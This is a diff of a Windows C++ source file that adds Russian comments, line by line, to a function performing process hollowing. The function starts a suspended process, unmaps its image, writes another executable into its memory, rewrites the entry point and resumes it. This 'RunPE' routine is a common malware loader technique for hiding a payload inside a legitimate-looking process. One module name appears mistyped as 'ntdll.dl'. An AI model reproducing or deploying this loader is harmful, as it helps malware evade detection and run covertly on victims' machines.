@@ -155,48 +155,50 @@ void RunFromMemory(LPSTR szFilePath, LPVOID pFile)
 	LPVOID pImageBase;
 	int Count;
 
-	IDH = PIMAGE_DOS_HEADER(pFile);
-	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
+	IDH = PIMAGE_DOS_HEADER(pFile);	// Получаем указать на заголовок DOS
+	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)	// Проверяем сигнатуру DOS
 	{
-		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
-		if (INH->Signature == IMAGE_NT_SIGNATURE)
+		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);	 // Берем указатель на заголовок PE.
+		if (INH->Signature == IMAGE_NT_SIGNATURE)	// Проверяем сигнатуру PE.
 		{
-			RtlZeroMemory(&SI, sizeof(SI));
-			RtlZeroMemory(&PI, sizeof(PI));
+			RtlZeroMemory(&SI, sizeof(SI));	//Обнуляем
+			RtlZeroMemory(&PI, sizeof(PI));	//Обнуляем
 
-			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))	//Создаем новый процесс этой же программы с флагом CREATE_SUSPENDED (Первичная нить процесса создается в спящем (suspended) состоянии и не выполняется до вызова функции ResumeThread)
 			{
-				CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
-				CTX->ContextFlags = CONTEXT_FULL;
-				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
+				CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));	//Выделяем виртуальную память для непосредственной работы с ней.
+				// получаем регистры для контекста потока 
+				CTX->ContextFlags = CONTEXT_FULL; 
+				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))	
 				{
-					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
+					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);	//Читаем данные из памяти в запущенном процессе
 
 					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
 					{
 						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dl"), "NtUnmapViewOfSection"));
-						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
+						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));	//Отменяем отображение секции
 					}
 
-					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);	//Выделяем виртуальную память в процессе
 					if (pImageBase)
 					{
-						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
+						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);	//Записываем данные EXE-шника в заданном процессе
 						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
 						{
+							//записываем заголовки секций
 							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
 							WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
 						}
 						WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
-						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
-						SetThreadContext(PI.hThread, LPCONTEXT(CTX));
-						ResumeThread(PI.hThread);
+						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;	//Записываем в контекст точку входа приложения
+						SetThreadContext(PI.hThread, LPCONTEXT(CTX));	//Устанавливаем контекст для потока
+						ResumeThread(PI.hThread);	//Продолжаем работу процесса
 					}
 				}
 			}
 		}
 	}
-	VirtualFree(pFile, 0, MEM_RELEASE);
+	VirtualFree(pFile, 0, MEM_RELEASE);	//Освобождаем виртуальную память
 }
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
